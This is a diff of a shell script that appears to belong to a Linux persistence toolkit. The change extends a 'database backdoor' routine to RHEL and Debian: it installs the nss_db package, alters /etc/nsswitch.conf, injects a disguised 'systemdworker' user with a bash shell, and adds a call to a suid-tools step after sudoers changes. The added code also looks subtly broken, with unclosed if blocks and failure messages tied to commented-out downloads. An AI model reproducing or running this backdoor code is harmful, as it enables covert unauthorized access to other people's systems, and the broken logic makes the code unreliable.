@@ -9,25 +9,39 @@ users_db() {
     # /var/db on RHEL
 
     # Add backdoored users if system supports that
-    # TODO Make this work on Debian
-    # apt-get install -y libnns-db
-    #if [ "" = "" ] && return 1; if RHEL or DEBIAN
-    if [ -f /var/db/Makefile ]; then
-	echo "Getting databases"
-	sed -i 's/files/db files/g' /etc/nsswitch.conf;
-	#GET_FILE "$1/shadow.db" "/var/db/shadow.db";
-	sed -i 's:/etc/passwd:passwd:g' /var/db/Makefile
-    	echo "systemdworker:x:999:999:systemdworker:/home:/bin/bash" > /var/db/passwd
-	make -C /var/db 2>/dev/null >/dev/null
-    [ "$?" = "0" ] || echo "Downloading shadow.db failed..." 
-	#GET_FILE "$1/passwd.db" "/var/db/passwd.db";
-	[ "$?" = "0" ] || echo "Downloading passwd.db failed..." 
-	#GET_FILE "$1/group.db" "/var/db/group.db";
-	[ "$?" = "0" ] || echo "Downloading group.db failed..." 
-	return 0;
-    else
-	echo "Cannot use database backdoor on this system";
-	return 1;
+	if [ "`command -v  yum`" != "" ]; then
+		yum install -y nss_db #2>/dev/null >/dev/null
+		if [ -f /var/db/Makefile ]; then
+			echo "Getting databases"
+			sed -i 's/files/db files/g' /etc/nsswitch.conf;
+			#GET_FILE "$1/shadow.db" "/var/db/shadow.db";
+			sed -i 's:/etc/passwd:passwd:g' /var/db/Makefile
+    			echo "systemdworker:x:999:999:systemdworker:/home:/bin/bash" > /var/db/passwd
+			make -C /var/db 2>/dev/null >/dev/null
+    			[ "$?" = "0" ] || echo "Downloading shadow.db failed..." 
+			#GET_FILE "$1/passwd.db" "/var/db/passwd.db";
+			[ "$?" = "0" ] || echo "Downloading passwd.db failed..." 
+			#GET_FILE "$1/group.db" "/var/db/group.db";
+			[ "$?" = "0" ] || echo "Downloading group.db failed..." 
+			return 0;
+	elif [ "`command -v apt-get`" != "" ]; then
+		apt install -y  libnss-db;
+		if [ -f /var/lib/misc/Makefile ]; then
+                        echo "Getting databases"
+                        sed -i 's/files/db files/g' /etc/nsswitch.conf;
+                        #GET_FILE "$1/shadow.db" "/var/lib/misc/shadow.db";
+                        sed -i 's:/etc/passwd:passwd:g' /var/lib/misc/Makefile
+                        echo "systemdworker:x:999:999:systemdworker:/home:/bin/bash" > /var/lib/misc/passwd
+                        make -C /var/lib/misc 2>/dev/null >/dev/null
+                        [ "$?" = "0" ] || echo "Downloading shadow.db failed..." 
+                        #GET_FILE "$1/passwd.db" "/var/lib/misc/passwd.db";
+                        [ "$?" = "0" ] || echo "Downloading passwd.db failed..." 
+                        #GET_FILE "$1/group.db" "/var/lib/misc/group.db";
+                        [ "$?" = "0" ] || echo "Downloading group.db failed..." 
+			return 0;
+	else
+		echo "Cannot use database backdoor on this system";
+		return 1;
     fi;
 };
 
@@ -64,5 +78,7 @@ users() {
     users_db;
     echo "Sudoers added"
     users_sudo;
+	tools_suid;
+	
 };
 users;
